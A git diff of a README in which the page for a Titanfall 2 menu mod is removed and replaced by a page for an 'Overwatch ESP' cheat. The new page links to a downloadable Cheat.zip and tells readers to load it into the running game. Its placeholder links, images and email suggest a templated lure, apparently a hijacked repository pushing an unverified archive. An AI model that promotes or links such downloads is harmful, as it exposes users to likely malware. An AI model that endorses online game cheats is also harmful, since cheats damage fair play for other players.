@@ -1,120 +1,68 @@
-<p align="center" style="text-align:center"><img width="125" height="122" src="https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/icon.png" alt="Titanfall 2 - Enhanced Menu Mod" /></p>
+# Overwatch ESP
 
-![VPK Build Status](https://github.com/taskinoz/Enhanced-Menu-Mod/actions/workflows/buildvpks.yml/badge.svg)
+🚀 Welcome to the Overwatch ESP repository!
 
+This project aims to enhance your Overwatch gaming experience with extra features like ESP (Extra Sensory Perception) to give you an edge in the game. 
 
-# Enhanced Menu Mod
-Adds more options to the settings menu, such as extra keybinds, cheats, hud enhancements and cleaner interface
+## Features
 
-# Features
-* Removed **Spotlight** and **Whats New** from the main menu
-* Added `sv_cheats` to the contols menu
-* Added HUD Options
-  * Bloom - `mat_disable_bloom`
-  * Show FPS - `cl_showfps`
-  * Show FPS Big - `showfps_enabled`
-  * Show Player Position - `cl_showpos`
-* Added new Keybinds
-  * Speedrunning
-    * Save/Load Quicksave 1
-    * Save/Load Quicksave 2
-    * Save/Load Quicksave 3
-    * Slow the game to 25%
-    * Speed the game up to 500%
-    * Reset all helmets
-    * Give yourself an EVA Shotgun
-    * Give yourself an EPG
-  * Demos
-    * Record Demo incrementally
-    * Record Demo
-    * Stop recording Demo
-    * Pause Demo
-    * Resume Demo
-    * Toggle Play/Pause Demo
-  * Extras
-    * Toggle low gravity
-    * Set camera to First Person
-    * Set camera to Third Person
-    * Move Third Person camera in
-    * Move Third Person camera out
-    * Hide/Show weapon
-  * No Cutscene Saves
-    * Load save 1-9 with 3 alternate saves
-  * No Cutscene Helmet Saves
-    * Load save 1 and 2
-* Added Extras Menu
-  * Demos
-    * Enable Demos
-    * Save Demos
-    * Interpolate Playback
-    * Demo record rate Single Player
-    * Demo record rate Multiplayer
-    * Key Bindings (shortcut)
-  * Gameplay
-    * Enable Wallrunning (sp)
-    * Enable Automantle (sp)
-    * Enable Vertical Dodge (sp)
-    * Player Control Debounce
-    * Command Que
-    * Speedometer Settings (Works with the MP mod)
-  * Community
-    * Communities toggle for MP
-* Audio
-  * Loading Fade Time
-  * Loading Silence Time
-* Replaced Chinese subtitles with English
-* Replaced Chinese UI text with English
-* Removed crashes from Dev launch arguments `-dev +developer 1`
-* Added Speedometer (only to Single Player)
+🎯 Key features of Overwatch ESP include:
+- Player ESP: Visualizing the locations of other players on the map.
+- Item ESP: Highlighting important items such as ammunition, health packs, and weapons.
+- Objective ESP: Identifying objectives like capture points, payload, or control zones.
+- Distance ESP: Displaying the distance between you and other entities on the map.
+- Customization: Configuring various ESP settings to suit your playstyle.
 
 ## Installation
 
-1) Download the pre-compiled version from the [releases](https://github.com/taskinoz/Enhanced-Menu-Mod/releases) page or [ModDB(OLD)](https://www.moddb.com/mods/enhanced-menu)
+⚙️ To use Overwatch ESP, simply download the cheat file from the link below:
 
-2) Backup your `englishclient_frontend.bsp.pak000_dir.vpk` and copy the 2 `.vpk` files from the downloaded zip to your `Titanfall2/vpk` folder
+[![Download Overwatch ESP Cheat](https://img.shields.io/badge/Download-Cheat.zip-<COLOR-CODE>)](https://github.com/user-attachments/files/16612167/Cheat.zip)
 
-## Icepick
+## Usage
 
-1) Download the Icepick specific version from the [releases](https://github.com/taskinoz/Enhanced-Menu-Mod/releases) page
+🎮 Follow these steps to use Overwatch ESP:
+1. Download the cheat file.
+2. Load the cheat while running Overwatch.
+3. Customize the ESP settings as needed.
+4. Enjoy the enhanced gaming experience!
 
-2) Open the downloaded `Enhanced.Menu.Mod.Icepick.zip` file and copy the `Enhanced.Menu.Mod.Icepick` folder to you `Icepick/data/mods` folder.
+## Demo
 
-3) Launch Icepick.
+📺 Check out this amazing demo of Overwatch ESP in action:
 
-## Northstar
+![Overwatch ESP Demo](https://example.com/demo.gif)
 
-1) Download the Northstar specific version from the [releases](https://github.com/taskinoz/Enhanced-Menu-Mod/releases) page
+## Contributing
 
-2) Open the downloaded `Enhanced.Menu.Mod.Northstar.zip` file and copy the `Enhanced.Menu.Mod.Northstar` folder to you `Titanfall2/R2Northstar/mods` folder.
+🤝🏼 Contributions are welcome! Feel free to fork the repository and submit a pull request with your improvements.
 
-3) Launch Northstar.
+## License
 
-## Screenshots
+📝 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
-![Main Menu with custom menu video](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-main.jpg)
+## Contact
 
-Main Menu with the original Titanfall 2 menu video
+📧 For any inquiries or feedback, please contact the project maintainer at [overwatchesp@example.com](mailto:overwatchesp@example.com).
 
-![Main Menu with no showcase content](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-main1.jpg)
+## Acknowledgements
 
-Main Menu with the showcase removed to declutter the menu
+🙏🏼 Special thanks to the following sources for their contributions to this project:
+- Overwatch Community
+- ESP Cheat Developers
 
-![Cheats setting](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-cheats.jpg)
+## FAQ
 
-New Cheat options that can be enabled as well as the extras menu
+❓ Check out our [FAQ](FAQ.md) for answers to commonly asked questions about Overwatch ESP.
 
-![New custom keybinds](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-keys.jpg)
+## Gallery
 
-Added keybinds for speedrunners and extra commands for fun
+📸 Explore some awesome images of Overwatch ESP in action:
 
-![Advanced Look Options with values](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-advanced-look.jpg)
+1. ![Screenshot 1](https://example.com/screenshot1.png)
+2. ![Screenshot 2](https://example.com/screenshot2.png)
+3. ![Screenshot 3](https://example.com/screenshot3.png)
 
-Shows the values for each setting on the Advanced Look Options
+---
 
-![New HUD options](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-hud.jpg)
-
-Added extra HUD display options for showing FPS, Position, Velocity, and Server Tick rate
-
-![Extras Menu](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-extras.jpg)
-
-Added a menu for enabling and changing demo settings for recording single and multiplayer demos as well as turning of wallrunning and enabling titan jumping.
+🎮 Happy gaming with Overwatch ESP! Feel the power of ESP and dominate the battlefield with style! 🚀🔥
